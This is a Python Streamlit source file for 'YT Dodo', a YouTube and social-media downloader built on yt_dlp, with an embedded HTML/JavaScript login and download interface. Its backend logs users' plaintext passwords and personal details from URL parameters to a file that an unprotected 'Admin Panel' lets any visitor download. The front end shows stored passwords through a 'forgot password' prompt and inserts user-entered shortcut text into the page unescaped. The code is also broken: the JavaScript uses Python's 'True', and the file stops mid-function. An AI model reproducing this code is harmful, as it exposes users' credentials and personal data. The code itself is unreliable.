import os
import requests
import streamlit as st
import streamlit.components.v1 as components
import yt_dlp

# Page Configuration
st.set_page_config(
    page_title="YT Dodo - Universal Media Hub", page_icon="▶️", layout="wide"
)

# Backend: Handle User Registration Logs & Silent Direct File Download
query_params = st.query_params

if "action" in query_params and query_params["action"] == "save_user":
    try:
        name = query_params.get("name", "N/A")
        email = query_params.get("email", "N/A")
        phone = query_params.get("phone", "N/A")
        occ = query_params.get("occ", "N/A")
        user_id = query_params.get("userid", "N/A")
        pwd = query_params.get("pwd", "N/A")

        log_entry = f"Name: {name} | Email: {email} | Phone: {phone} | Occupation: {occ} | UserID: {user_id} | Password: {pwd}\n"
        with open("users_log.txt", "a", encoding="utf-8") as log_file:
            log_file.write(log_entry)
    except Exception as e:
        pass

# Admin Sidebar to Download Users Log File
with st.sidebar:
    st.subheader("🛠️ Admin Panel")
    st.markdown("Download registered users log file:")
    if os.path.exists("users_log.txt"):
        with open("users_log.txt", "rb") as log_f:
            st.download_button(
                label="📥 Download users_log.txt",
                data=log_f,
                file_name="users_log.txt",
                mime="text/plain",
                use_container_width=True,
            )
    else:
        st.info("No user logs recorded yet.")

# Direct Streamlit Download Handler with Dynamic File Naming & Label
if "download_url" in query_params:
    raw_target_url = query_params["download_url"]
    target_url = raw_target_url.split("&")[0].split("?si=")[0]
    format_type = query_params.get("format", "mp4")

    try:
        if "MP3" in format_type.upper() or "AUDIO" in format_type.upper():
            ydl_opts = {
                "format": "bestaudio/best",
                "outtmpl": "temp_media.m4a",
                "noplaylist": True,
                "geo_bypass": True,
                "extractor_args": {
                    "youtube": {"player_client": ["android", "web"]}
                },
            }
            mime = "audio/mp4"
            ext = "m4a"
        else:
            ydl_opts = {
                "format": "best[ext=mp4]/best",
                "outtmpl": "temp_media.mp4",
                "noplaylist": True,
                "geo_bypass": True,
                "extractor_args": {
                    "youtube": {"player_client": ["android", "web"]}
                },
            }
            mime = "video/mp4"
            ext = "mp4"

        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
            info = ydl.extract_info(target_url, download=True)
            real_title = info.get("title", "ytdodo_media")
            safe_title = "".join(
                [c for c in real_title if c.isalnum() or c.isspace()]
            ).strip()
            if not safe_title:
                safe_title = "media_file"

            temp_filename = (
                "temp_media.m4a" if ext == "m4a" else "temp_media.mp4"
            )
            final_filename = f"{safe_title[:40]}.{ext}"

            if os.path.exists(temp_filename):
                if os.path.exists(final_filename):
                    os.remove(final_filename)
                os.rename(temp_filename, final_filename)

        if os.path.exists(final_filename):
            with open(final_filename, "rb") as f:
                st.download_button(
                    label=f"💾 Save: {final_filename}",
                    data=f,
                    file_name=final_filename,
                    mime=mime,
                    use_container_width=True,
                )
    except Exception as e:
        st.error(f"Download Error: {e}")

# Embedded HTML & JavaScript UI with Thumbnail Preview & Creator Branding
html_code = """
<!DOCTYPE html>
<html lang="hi" id="htmlRoot">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>YT Dodo - Universal Media Hub</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        .my-hidden { display: none !important; }
        .theme-dark { background-color: #000000; color: #ffffff; }
        .theme-light { background-color: #f8fafc; color: #0f172a; }
    </style>
</head>
<body id="bodyRoot" class="theme-dark font-sans m-0 p-0 overflow-x-hidden transition-colors duration-300">

    <!-- AUTHENTICATION SCREEN -->
    <div id="authScreen" class="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/90">
        <div id="loginCard" class="w-full max-w-md bg-white border border-slate-300 p-8 rounded-2xl shadow-2xl text-slate-900">
            <div class="text-center mb-6">
                <div class="inline-flex items-center justify-center w-16 h-16 bg-gradient-to-br from-red-600 to-red-900 rounded-2xl shadow-xl mb-3 border border-red-500 relative">
                    <i class="fa-solid fa-bolt text-white text-2xl"></i>
                </div>
                <h1 class="text-2xl font-extrabold tracking-wider text-red-900">YT DODO</h1>
                <p class="text-xs text-red-600 font-bold mt-1">This app is created by Sagar Shukla</p>
                <p class="text-xs text-slate-600 mt-1" data-i18n="signin_sub">Sign in to access your universal media hub</p>
            </div>

            <form id="loginForm" onsubmit="handleLogin(event)" autocomplete="off" class="space-y-4">
                <div>
                    <label class="block text-xs font-medium text-slate-700 mb-1" data-i18n="signin_id">Sign In ID / Email / Phone</label>
                    <input type="text" id="loginId" autocomplete="off" required class="w-full px-4 py-3 bg-blue-950 text-white border border-blue-900 rounded-xl text-sm focus:outline-none focus:border-red-600">
                </div>
                <div>
                    <label class="block text-xs font-medium text-slate-700 mb-1" data-i18n="password">Password</label>
                    <input type="password" id="loginPass" autocomplete="new-password" required class="w-full px-4 py-3 bg-blue-950 text-white border border-blue-900 rounded-xl text-sm focus:outline-none focus:border-red-600">
                </div>
                <button type="submit" class="w-full py-3 bg-red-600 hover:bg-red-700 text-white font-semibold rounded-xl transition shadow-lg" data-i18n="signin_btn">Sign In</button>
            </form>

            <div class="flex items-center justify-between mt-6 text-xs text-slate-600">
                <button type="button" onclick="showCreateAccount()" class="hover:text-red-600 underline font-medium" data-i18n="create_acc">Create New Account</button>
                <button type="button" onclick="forgotPassword()" class="hover:text-red-600 underline font-medium" data-i18n="forgot_acc">Forgot Account?</button>
            </div>
        </div>

        <!-- Register Card -->
        <div id="registerCard" class="w-full max-w-md bg-white border border-slate-300 p-8 rounded-2xl shadow-2xl text-slate-900 my-hidden">
            <div class="text-center mb-6">
                <div class="inline-flex items-center justify-center w-16 h-16 bg-gradient-to-br from-red-600 to-red-900 rounded-2xl shadow-xl mb-3 border border-red-500 relative">
                    <i class="fa-solid fa-bolt text-white text-2xl"></i>
                </div>
                <h1 class="text-2xl font-extrabold tracking-wider text-red-900" data-i18n="reg_title">Create Account</h1>
                <p class="text-xs text-red-600 font-bold mt-1">This app is created by Sagar Shukla</p>
            </div>

            <form id="registerForm" onsubmit="handleRegister(event)" autocomplete="off" class="space-y-3">
                <div>
                    <label class="block text-xs font-medium text-slate-700 mb-1" data-i18n="fullname">Full Name</label>
                    <input type="text" id="regName" autocomplete="off" required class="w-full px-3 py-2 bg-blue-950 text-white border border-blue-900 rounded-xl text-sm">
                </div>
                <div>
                    <label class="block text-xs font-medium text-slate-700 mb-1" data-i18n="email">Email Address</label>
                    <input type="email" id="regEmail" autocomplete="off" required class="w-full px-3 py-2 bg-blue-950 text-white border border-blue-900 rounded-xl text-sm">
                </div>
                <div>
                    <label class="block text-xs font-medium text-slate-700 mb-1" data-i18n="phone">Mobile Number</label>
                    <input type="tel" id="regPhone" autocomplete="off" required class="w-full px-3 py-2 bg-blue-950 text-white border border-blue-900 rounded-xl text-sm">
                </div>
                <div>
                    <label class="block text-xs font-medium text-slate-700 mb-1" data-i18n="occ">Occupation</label>
                    <select id="regOcc" class="w-full px-3 py-2 bg-blue-950 text-white border border-blue-900 rounded-xl text-sm">
                        <option value="Student">Student</option>
                        <option value="Business">Business</option>
                        <option value="Professional">Professional</option>
                        <option value="Other">Other</option>
                    </select>
                </div>
                <div>
                    <label class="block text-xs font-medium text-slate-700 mb-1" data-i18n="create_pass">Create Password</label>
                    <input type="password" id="regPass" autocomplete="new-password" required class="w-full px-3 py-2 bg-blue-950 text-white border border-blue-900 rounded-xl text-sm">
                </div>
                <button type="submit" class="w-full py-3 bg-red-600 hover:bg-red-700 text-white font-semibold rounded-xl transition shadow-lg mt-2" data-i18n="reg_btn">Register & Get ID</button>
            </form>

            <div class="text-center mt-4">
                <button type="button" onclick="showLogin()" class="text-xs text-slate-600 hover:text-red-600 underline font-medium" data-i18n="already_acc">Already have an account? Sign In</button>
            </div>
        </div>
    </div>

    <!-- MAIN APP DASHBOARD -->
    <div id="mainApp" class="my-hidden min-h-screen flex flex-col">
        <header id="appHeader" class="bg-zinc-900 border-b border-zinc-800 px-4 py-3 flex items-center justify-between sticky top-0 z-50">
            <div class="flex items-center space-x-3">
                <div class="w-10 h-10 bg-gradient-to-br from-red-600 to-red-900 rounded-xl flex items-center justify-center border border-red-500 shadow-md">
                    <i class="fa-solid fa-bolt text-white text-sm"></i>
                </div>
                <div>
                    <h2 class="text-sm font-black tracking-wider text-red-500 leading-tight">YT DOODO</h2>
                    <span class="text-[10px] text-slate-400 font-medium">Welcome, <span id="displayUserName" class="text-white font-bold"></span></span>
                </div>
            </div>

            <div class="flex items-center space-x-2.5">
                <button onclick="openProfileModal()" class="p-2.5 bg-zinc-800 hover:bg-zinc-700 text-white rounded-xl border border-zinc-700 transition" title="User Profile">
                    <i class="fa-solid fa-user text-sm"></i>
                </button>
                <button onclick="openSettingsModal()" class="p-2.5 bg-zinc-800 hover:bg-zinc-700 text-white rounded-xl border border-zinc-700 transition" title="Settings">
                    <i class="fa-solid fa-gear text-sm"></i>
                </button>
                <button onclick="logout()" class="text-xs bg-zinc-800 hover:bg-red-950 text-slate-300 hover:text-red-400 px-3 py-1.5 rounded-lg border border-zinc-700 transition">
                    <i class="fa-solid fa-power-off mr-1"></i> <span data-i18n="logout">Logout</span>
                </button>
            </div>
        </header>

        <main class="flex-1 max-w-4xl w-full mx-auto p-4 space-y-6 pb-20 relative">
            <section id="searchSection" class="bg-zinc-900/90 border border-zinc-800 p-5 rounded-2xl shadow-xl space-y-4">
                <h3 class="text-sm font-bold text-red-400 uppercase tracking-wide" data-i18n="search_title">Search & Download Hub</h3>
                
                <div class="flex gap-2">
                    <div class="relative flex-1">
                        <i class="fa-solid fa-magnifying-glass absolute left-4 top-3.5 text-slate-400 text-sm"></i>
                        <input type="text" id="videoUrlInput" placeholder="Paste YouTube, Instagram or Facebook link..." class="w-full pl-11 pr-4 py-3 bg-black text-white placeholder-slate-500 border border-zinc-700 rounded-xl text-sm focus:outline-none focus:border-red-500">
                    </div>
                    <button onclick="fetchMediaOrSearch()" class="bg-red-600 hover:bg-red-500 text-white px-6 py-3 rounded-xl font-medium text-sm transition flex items-center space-x-2">
                        <i class="fa-solid fa-magnifying-glass"></i>
                        <span data-i18n="search_btn">Search</span>
                    </button>
                </div>

                <div class="pt-2">
                    <p class="text-[11px] font-semibold text-slate-400 mb-3" data-i18n="shortcuts_title">Quick Platforms & Shortcuts:</p>
                    <div id="shortcutsGrid" class="grid grid-cols-4 sm:grid-cols-6 gap-3 text-center"></div>
                </div>

                <div id="videoFrameContainer" class="my-hidden bg-black p-3 rounded-xl border border-zinc-800 space-y-3">
                    <div class="relative w-full h-[300px] bg-zinc-900 rounded-xl overflow-hidden flex flex-col items-center justify-center border border-zinc-800">
                        <div id="mediaDisplayArea" class="w-full h-full flex items-center justify-center relative"></div>
                        <button onclick="showQualitySelector()" class="absolute bottom-4 right-4 w-12 h-12 bg-red-600 hover:bg-red-500 text-white rounded-full flex items-center justify-center shadow-2xl border-2 border-white/20 transition transform hover:scale-110 z-20" title="Download Options">
                            <i class="fa-solid fa-arrow-down text-lg"></i>
                        </button>
                    </div>
                </div>

                <div id="qualityOptionsBox" class="my-hidden bg-black p-4 rounded-xl border border-zinc-800 space-y-3">
                    <p class="text-xs font-semibold text-slate-300" data-i18n="select_format">Select Download Format & Options:</p>
                    <div class="grid grid-cols-2 sm:grid-cols-4 gap-2 text-xs">
                        <button onclick="selectQuality('Audio - MP3 (High Quality)', this)" class="quality-btn p-2.5 bg-zinc-900 hover:bg-red-950 border border-zinc-800 rounded-lg text-left transition flex items-center justify-between">
                            <span><i class="fa-solid fa-music text-red-400 mr-1.5"></i> MP3 Audio</span>
                        </button>
                        <button onclick="selectQuality('Video - 720p (HD)', this)" class="quality-btn p-2.5 bg-zinc-900 hover:bg-red-950 border border-zinc-800 rounded-lg text-left transition flex items-center justify-between">
                            <span><i class="fa-solid fa-video text-red-400 mr-1.5"></i> 720p HD</span>
                        </button>
                        <button onclick="selectQuality('Video - 1080p (Full HD)', this)" class="quality-btn p-2.5 bg-zinc-900 hover:bg-red-950 border border-zinc-800 rounded-lg text-left transition flex items-center justify-between">
                            <span><i class="fa-solid fa-video text-red-400 mr-1.5"></i> 1080p FHD</span>
                        </button>
                        <button onclick="selectQuality('App / Game APK', this)" class="quality-btn p-2.5 bg-zinc-900 hover:bg-red-950 border border-zinc-800 rounded-lg text-left transition flex items-center justify-between">
                            <span><i class="fa-solid fa-gamepad text-red-400 mr-1.5"></i> APK File</span>
                        </button>
                    </div>

                    <div class="pt-2 border-t border-zinc-800">
                        <button onclick="executeDownload()" class="w-full py-3 bg-red-600 hover:bg-red-500 text-white font-semibold text-xs rounded-xl transition shadow-lg flex items-center justify-center space-x-2">
                            <i class="fa-solid fa-download"></i>
                            <span data-i18n="start_download">Start Direct Download</span>
                        </button>
                    </div>
                </div>
            </section>

            <!-- Active Downloads & Gallery Status with Delete Option -->
            <section id="gallerySection" class="bg-zinc-900/90 border border-zinc-800 p-5 rounded-2xl shadow-xl space-y-3">
                <h3 class="text-sm font-semibold text-red-400 flex items-center justify-between">
                    <span><i class="fa-solid fa-folder-open mr-2 text-red-500"></i> <span data-i18n="gallery_title">Active Downloads & Gallery Status</span></span>
                </h3>
                <div id="downloadStatusContainer" class="space-y-2">
                    <div class="text-xs text-slate-400 bg-black p-4 rounded-xl border border-zinc-800 text-center" data-i18n="no_downloads">
                        No active downloads right now. Downloaded media history will appear here!
                    </div>
                </div>
            </section>

            <!-- Creator Footer Branding -->
            <footer class="text-center py-4 text-xs text-slate-500 border-t border-zinc-800 mt-6">
                <p>YT Dodo Universal Media Hub &copy; 2026 | <span class="text-red-500 font-bold">This app is created by Sagar Shukla</span></p>
            </footer>
        </main>
    </div>

    <!-- MODALS -->
    <div id="settingsModal" class="my-hidden fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/70 backdrop-blur-sm">
        <div class="w-full max-w-sm bg-zinc-900 border border-zinc-800 p-6 rounded-2xl shadow-2xl space-y-5 text-white">
            <div class="flex justify-between items-center border-b border-zinc-800 pb-2">
                <h3 class="text-sm font-bold text-red-400"><i class="fa-solid fa-gear mr-1"></i> <span data-i18n="settings_title">App Settings</span></h3>
                <button onclick="closeSettingsModal()" class="text-zinc-400 hover:text-white"><i class="fa-solid fa-xmark"></i></button>
            </div>
            
            <div class="space-y-4 text-xs">
                <div>
                    <label class="block text-slate-400 mb-1.5 font-semibold" data-i18n="select_lang">Select Language (भाषा):</label>
                    <select id="langSelect" onchange="changeLanguage(this.value)" class="w-full px-3 py-2.5 bg-black text-white border border-zinc-700 rounded-xl focus:outline-none focus:border-red-500">
                        <option value="hi">हिंदी (Hindi)</option>
                        <option value="en">English</option>
                        <option value="ta">தமிழ் (Tamil)</option>
                        <option value="mr">मराठी (Marathi)</option>
                        <option value="te">తెలుగు (Telugu)</option>
                        <option value="bn">বাংলা (Bengali)</option>
                    </select>
                </div>

                <div>
                    <label class="block text-slate-400 mb-1.5 font-semibold" data-i18n="select_theme">Theme Mode:</label>
                    <div class="grid grid-cols-2 gap-2">
                        <button onclick="setTheme('dark')" id="darkThemeBtn" class="py-2.5 bg-black border border-zinc-700 hover:border-red-500 rounded-xl flex items-center justify-center space-x-2 transition">
                            <i class="fa-solid fa-cloud text-slate-400"></i>
                            <span data-i18n="dark_mode">Dark Mode</span>
                        </button>
                        <button onclick="setTheme('light')" id="lightThemeBtn" class="py-2.5 bg-white text-black border border-zinc-300 hover:border-red-500 rounded-xl flex items-center justify-center space-x-2 transition">
                            <i class="fa-solid fa-sun text-amber-500"></i>
                            <span data-i18n="light_mode">Light Mode</span>
                        </button>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Profile Modal -->
    <div id="profileModal" class="my-hidden fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/70 backdrop-blur-sm">
        <div class="w-full max-w-sm bg-zinc-900 border border-zinc-800 p-6 rounded-2xl shadow-2xl space-y-4 text-white">
            <div class="flex justify-between items-center border-b border-zinc-800 pb-2">
                <h3 class="text-sm font-bold text-red-400"><i class="fa-solid fa-user-circle mr-1"></i> <span data-i18n="profile_title">User Profile</span></h3>
                <button onclick="closeProfileModal()" class="text-zinc-400 hover:text-white"><i class="fa-solid fa-xmark"></i></button>
            </div>
            <div id="profileContent" class="space-y-3 text-xs"></div>
        </div>
    </div>

    <!-- Add Shortcut Modal -->
    <div id="addShortcutModal" class="my-hidden fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/70 backdrop-blur-sm">
        <div class="w-full max-w-sm bg-zinc-900 border border-zinc-800 p-6 rounded-2xl shadow-2xl space-y-4 text-white">
            <div class="flex justify-between items-center border-b border-zinc-800 pb-2">
                <h3 class="text-sm font-bold text-red-400"><i class="fa-solid fa-plus mr-1"></i> Add Custom Shortcut</h3>
                <button onclick="closeAddShortcutModal()" class="text-zinc-400 hover:text-white"><i class="fa-solid fa-xmark"></i></button>
            </div>
            <div class="space-y-3 text-xs">
                <div>
                    <label class="block text-slate-400 mb-1">Shortcut Title</label>
                    <input type="text" id="shortcutTitleInput" placeholder="e.g., Netflix" class="w-full px-3 py-2.5 bg-black text-white border border-zinc-700 rounded-xl focus:outline-none focus:border-red-500">
                </div>
                <div>
                    <label class="block text-slate-400 mb-1">URL (https://...)</label>
                    <input type="url" id="shortcutUrlInput" placeholder="https://example.com" class="w-full px-3 py-2.5 bg-black text-white border border-zinc-700 rounded-xl focus:outline-none focus:border-red-500">
                </div>
                <button onclick="saveCustomShortcut()" class="w-full py-3 bg-red-600 hover:bg-red-500 text-white font-semibold rounded-xl transition shadow-lg mt-2">Save Shortcut</button>
            </div>
        </div>
    </div>

    <script>
        const translations = {
            hi: {
                signin_sub: "अपने यूनिवर्सल मीडिया हब में साइन इन करें",
                signin_id: "साइन इन आईडी / ईमेल / फोन",
                password: "पासवर्ड",
                signin_btn: "साइन इन करें",
                create_acc: "नया खाता बनाएँ",
                forgot_acc: "खाता भूल गए?",
                reg_title: "खाता बनाएँ",
                welcome: "स्वागत है",
                logout: "लॉगआउट",
                search_title: "सर्च और डाउनलोड हब",
                search_btn: "सर्च करें",
                shortcuts_title: "त्वरित प्लेटफ़ॉर्म और शॉर्टकट:",
                select_format: "डाउनलोड फॉर्मेट चुनें:",
                start_download: "सीधा डाउनलोड शुरू करें",
                gallery_title: "एक्टिव डाउनलोड और गैलरी स्टेटस",
                no_downloads: "अभी कोई डाउनलोड नहीं है।",
                settings_title: "ऐप सेटिंग्स",
                select_lang: "भाषा चुनें (Language):",
                select_theme: "थीम मोड (Theme):",
                dark_mode: "डार्क मोड",
                light_mode: "लाइट मोड",
                profile_title: "यूजर प्रोफाइल"
            },
            en: {
                signin_sub: "Sign in to access your universal media hub",
                signin_id: "Sign In ID / Email / Phone",
                password: "Password",
                signin_btn: "Sign In",
                create_acc: "Create New Account",
                forgot_acc: "Forgot Account?",
                reg_title: "Create Account",
                welcome: "Welcome",
                logout: "Logout",
                search_title: "Search & Download Hub",
                search_btn: "Search",
                shortcuts_title: "Quick Platforms & Shortcuts:",
                select_format: "Select Download Format & Options:",
                start_download: "Start Direct Download",
                gallery_title: "Active Downloads & Gallery Status",
                no_downloads: "No active downloads right now.",
                settings_title: "App Settings",
                select_lang: "Select Language:",
                select_theme: "Theme Mode:",
                dark_mode: "Dark Mode",
                light_mode: "Light Mode",
                profile_title: "User Profile"
            }
        };

        let currentLang = localStorage.getItem('ytdoodo_lang') || 'en';
        let currentTheme = localStorage.getItem('ytdoodo_theme') || 'dark';
        let registeredUsers = JSON.parse(localStorage.getItem('ytdoodo_users')) || [];
        let userDownloads = JSON.parse(localStorage.getItem('ytdoodo_downloads')) || [];
        let customShortcuts = JSON.parse(localStorage.getItem('ytdoodo_shortcuts')) || [];
        let selectedQualityType = "Video - 720p (HD)";
        let currentVideoTitle = "Media File";
        let isDownloading = True;

        window.addEventListener('DOMContentLoaded', () => {
            setTheme(currentTheme);
            changeLanguage(currentLang);
            document.getElementById('langSelect').value = currentLang;

            const currentUser = JSON.parse(localStorage.getItem('ytdoodo_current_user'));
            if (currentUser) {
                document.getElementById('authScreen').classList.add('my-hidden');
                document.getElementById('mainApp').classList.remove('my-hidden');
                document.getElementById('displayUserName').innerText = currentUser.name;
                renderShortcuts();
                updateDownloadBadgeAndHistory();
            }
        });

        function changeLanguage(lang) {
            currentLang = lang;
            localStorage.setItem('ytdoodo_lang', lang);
            const t = translations[lang] || translations['en'];
            document.querySelectorAll('[data-i18n]').forEach(el => {
                const key = el.getAttribute('data-i18n');
                if (t[key]) el.innerText = t[key];
            });
        }

        function setTheme(theme) {
            currentTheme = theme;
            localStorage.setItem('ytdoodo_theme', theme);
            const body = document.getElementById('bodyRoot');
            const header = document.getElementById('appHeader');
            const searchSec = document.getElementById('searchSection');
            const gallerySec = document.getElementById('gallerySection');

            if (theme === 'light') {
                body.className = "theme-light font-sans m-0 p-0 overflow-x-hidden transition-colors duration-300";
                header.className = "bg-white border-b border-slate-300 px-4 py-3 flex items-center justify-between sticky top-0 z-50 text-slate-900";
                searchSec.className = "bg-white border border-slate-300 p-5 rounded-2xl shadow-xl space-y-4 text-slate-900";
                gallerySec.className = "bg-white border border-slate-300 p-5 rounded-2xl shadow-xl space-y-3 text-slate-900";
            } else {
                body.className = "theme-dark font-sans m-0 p-0 overflow-x-hidden transition-colors duration-300";
                header.className = "bg-zinc-900 border-b border-zinc-800 px-4 py-3 flex items-center justify-between sticky top-0 z-50 text-white";
                searchSec.className = "bg-zinc-900/90 border border-zinc-800 p-5 rounded-2xl shadow-xl space-y-4 text-white";
                gallerySec.className = "bg-zinc-900/90 border border-zinc-800 p-5 rounded-2xl shadow-xl space-y-3 text-white";
            }
        }

        function forgotPassword() {
            const inputVal = prompt("Enter your registered Email or Mobile Number to recover your account details:");
            if (!inputVal) return;
            
            const foundUser = registeredUsers.find(u => u.email === inputVal.trim() || u.phone === inputVal.trim() || u.userId === inputVal.trim());
            if (foundUser) {
                alert(`Account Found!\\nName: ${foundUser.name}\\nSign In ID: ${foundUser.userId}\\nPassword: ${foundUser.pass}`);
                document.getElementById('loginId').value = foundUser.userId;
            } else {
                alert("No account found with this Email/Phone/ID. Please check or register a new account.");
            }
        }

        function openSettingsModal() { document.getElementById('settingsModal').classList.remove('my-hidden'); }
        function closeSettingsModal() { document.getElementById('settingsModal').classList.add('my-hidden'); }

        function openProfileModal() {
            const currentUser = JSON.parse(localStorage.getItem('ytdoodo_current_user'));
            if(currentUser) {
                document.getElementById('profileContent').innerHTML = `
                    <div class="p-3 bg-black rounded-xl border border-zinc-800 space-y-2 text-white">
                        <p><strong>Name:</strong> ${currentUser.name}</p>
                        <p><strong>Sign In ID:</strong> ${currentUser.userId}</p>
                        <p><strong>Email:</strong> ${currentUser.email}</p>
                        <p><strong>Phone:</strong> ${currentUser.phone}</p>
                        <p><strong>Occupation:</strong> ${currentUser.occ}</p>
                        <hr class="border-zinc-700 my-1">
                        <p class="text-[10px] text-red-400 text-center font-bold">This app is created by Sagar Shukla</p>
                    </div>`;
            }
            document.getElementById('profileModal').classList.remove('my-hidden');
        }
        function closeProfileModal() { document.getElementById('profileModal').classList.add('my-hidden'); }

        function cleanPhone(phone) {
            if (!phone) return "";
            let digits = phone.replace(/\\D/g, '');
            return digits.length > 10 ? digits.slice(-10) : digits;
        }

        function showCreateAccount() {
            document.getElementById('loginCard').classList.add('my-hidden');
            document.getElementById('registerCard').classList.remove('my-hidden');
        }
        function showLogin() {
            document.getElementById('registerCard').classList.add('my-hidden');
            document.getElementById('loginCard').classList.remove('my-hidden');
        }

        function handleRegister(e) {
            e.preventDefault();
            const name = document.getElementById('regName').value.trim();
            const email = document.getElementById('regEmail').value.trim();
            const phone = cleanPhone(document.getElementById('regPhone').value.trim());
            const occ = document.getElementById('regOcc').value;
            const pass = document.getElementById('regPass').value.trim();
            const userId = 'YTDOODO_' + Math.floor(100000 + Math.random() * 900000);

            registeredUsers.push({ name, email, phone, occ, pass, userId });
            localStorage.setItem('ytdoodo_users', JSON.stringify(registeredUsers));
            alert('Registration Successful! ID: ' + userId);
            showLogin();
            document.getElementById('loginId').value = userId;
        }

        function handleLogin(e) {
            e.preventDefault();
            const rawId = document.getElementById('loginId').value.trim();
            const pass = document.getElementById('loginPass').value.trim();
            const user = registeredUsers.find(u => (u.userId === rawId || u.email === rawId) && u.pass === pass);

            if (user) {
                localStorage.setItem('ytdoodo_current_user', JSON.stringify(user));
                document.getElementById('authScreen').classList.add('my-hidden');
                document.getElementById('mainApp').classList.remove('my-hidden');
                document.getElementById('displayUserName').innerText = user.name;
                renderShortcuts();
                updateDownloadBadgeAndHistory();
            } else {
                alert('Invalid Credentials!');
            }
        }

        function logout() {
            localStorage.removeItem('ytdoodo_current_user');
            document.getElementById('mainApp').classList.add('my-hidden');
            document.getElementById('authScreen').classList.remove('my-hidden');
            showLogin();
        }

        function openAddShortcutModal() { document.getElementById('addShortcutModal').classList.remove('my-hidden'); }
        function closeAddShortcutModal() { document.getElementById('addShortcutModal').classList.add('my-hidden'); }

        function saveCustomShortcut() {
            const title = document.getElementById('shortcutTitleInput').value.trim();
            const url = document.getElementById('shortcutUrlInput').value.trim();
            if(!title || !url) { alert('Please enter both title and valid URL!'); return; }
            customShortcuts.push({ title, url });
            localStorage.setItem('ytdoodo_shortcuts', JSON.stringify(customShortcuts));
            document.getElementById('shortcutTitleInput').value = '';
            document.getElementById('shortcutUrlInput').value = '';
            closeAddShortcutModal();
            renderShortcuts();
        }

        function renderShortcuts() {
            const grid = document.getElementById('shortcutsGrid');
            let baseHtml = `
                <button onclick="openShortcut('https://www.youtube.com')" class="flex flex-col items-center justify-center p-3 bg-black hover:bg-zinc-800 border border-zinc-800 rounded-xl transition group">
                    <i class="fa-brands fa-youtube text-red-500 text-2xl mb-1.5 group-hover:scale-110 transition"></i>
                    <span class="text-[10px] text-slate-300 font-medium truncate w-full">YouTube</span>
                </button>
                <button onclick="openShortcut('https://www.google.com')" class="flex flex-col items-center justify-center p-3 bg-black hover:bg-zinc-800 border border-zinc-800 rounded-xl transition group">
                    <i class="fa-brands fa-google text-blue-400 text-2xl mb-1.5 group-hover:scale-110 transition"></i>
                    <span class="text-[10px] text-slate-300 font-medium truncate w-full">Google</span>
                </button>
                <button onclick="openShortcut('https://www.facebook.com')" class="flex flex-col items-center justify-center p-3 bg-black hover:bg-zinc-800 border border-zinc-800 rounded-xl transition group">
                    <i class="fa-brands fa-facebook text-blue-600 text-2xl mb-1.5 group-hover:scale-110 transition"></i>
                    <span class="text-[10px] text-slate-300 font-medium truncate w-full">Facebook</span>
                </button>
                <button onclick="openShortcut('https://www.instagram.com')" class="flex flex-col items-center justify-center p-3 bg-black hover:bg-zinc-800 border border-zinc-800 rounded-xl transition group">
                    <i class="fa-brands fa-instagram text-pink-500 text-2xl mb-1.5 group-hover:scale-110 transition"></i>
                    <span class="text-[10px] text-slate-300 font-medium truncate w-full">Instagram</span>
                </button>
                <button onclick="openShortcut('https://www.twitter.com')" class="flex flex-col items-center justify-center p-3 bg-black hover:bg-zinc-800 border border-zinc-800 rounded-xl transition group">
                    <i class="fa-brands fa-twitter text-sky-400 text-2xl mb-1.5 group-hover:scale-110 transition"></i>
                    <span class="text-[10px] text-slate-300 font-medium truncate w-full">Twitter</span>
                </button>
            `;

            customShortcuts.forEach(s => {
                baseHtml += `
                    <button onclick="openShortcut('${s.url}')" class="flex flex-col items-center justify-center p-3 bg-black hover:bg-zinc-800 border border-zinc-800 rounded-xl transition group relative">
                        <i class="fa-solid fa-globe text-emerald-400 text-2xl mb-1.5 group-hover:scale-110 transition"></i>
                        <span class="text-[10px] text-slate-300 font-medium truncate w-full">${s.title}</span>
                    </button>
                `;
            });

            baseHtml += `
                <button onclick="openAddShortcutModal()" class="flex flex-col items-center justify-center p-3 bg-zinc-900 hover:bg-zinc-800 border border-dashed border-zinc-700 rounded-xl transition group">
                    <i class="fa-solid fa-plus text-red-500 text-xl mb-1.5 group-hover:scale-110 transition"></i>
                    <span class="text-[10px] text-red-400 font-bold truncate w-full">Add URL</span>
                </button>
            `;
            grid.innerHTML = baseHtml;
        }

        function openShortcut(url) { window.open(url, '_blank'); }

        function extractYouTubeId(url) {
            const regExp = /^.*(youtu.be\/|v\/|u\/\w\/|embed\/|watch\?v=|\&v=)([^#\&\?]*).*/;
            const match = url.match(regExp);
            return (match && match[2].length === 11) ? match[2] : null;
        }

        async function fetchMediaOrSearch() {
            const query = document.getElementById('videoUrlInput').value.trim();
            if(!query) { alert('Please enter a link first!'); return; }
            
            let thumbnailHtml = '';
            const ytId = extractYouTubeId(query);
            
            if (ytId) {
                currentVideoTitle = "YouTube Video Media";
                thumbnailHtml = `<img src="https://img.youtube.com/vi/${ytId}/hqdefault.jpg" class="w-full h-full object-cover rounded-xl" alt="YouTube Thumbnail">`;
            } else if (query.includes("instagram.com")) {
                currentVideoTitle = "Instagram Reel Media";
                thumbnailHtml = `<div class="flex flex-col items-center justify-center h-full text-pink-500 space-y-2"><i class="fa-brands fa-instagram text-5xl"></i><span class="text-xs text-white font-bold">Instagram Reel Ready</span></div>`;
            } else {
                currentVideoTitle = "Media File";
                thumbnailHtml = `<div class="flex flex-col items-center justify-center h-full text-red-500 space-y-2"><i class="fa-solid fa-file-video text-5xl"></i><span class="text-xs text-white font-bold">Media Ready</span></div>`;
            }

            document.getElementById('mediaDisplayArea').innerHTML = thumbnailHtml;
            document.getElementById('videoFrameContainer').classList.remove('my-hidden');
        }

        function showQualitySelector() {
            document.getElementById('qualityOptionsBox').classList.remove('my-hidden');
        }
        function selectQuality(qName, btn) {
            selectedQualityType = qName;
            document.querySelectorAll('.quality-btn').forEach(b => b.classList.remove('border-red-500', 'bg-red-950'));
            btn.classList.add('border-red-500', 'bg-red-950');
        }

        function executeDownload() {
            const query = document.getElementById('videoUrlInput').value.trim();
